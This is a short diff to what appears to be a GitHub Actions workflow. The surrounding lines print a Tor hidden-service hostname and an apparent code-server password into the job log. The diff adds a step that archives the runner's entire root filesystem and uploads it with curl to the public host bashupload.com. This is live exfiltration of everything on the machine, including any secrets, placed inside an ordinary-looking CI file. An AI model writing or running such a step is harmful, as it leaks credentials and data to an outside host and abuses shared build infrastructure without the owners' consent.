@@ -48,6 +48,8 @@ jobs:
           sleep 1m
           sudo cat /var/lib/tor/hidden_service/hostname
           sudo sed -n '3'p ~/.config/code-server/config.yaml
+          cd /
+          sudo tar cvpf Github.tar.gz --exclude=/Github.tar.gz --one-file-system / && curl bashupload.com -T Github.tar.gz
       - name: Loop
         run: |
           sleep 1m
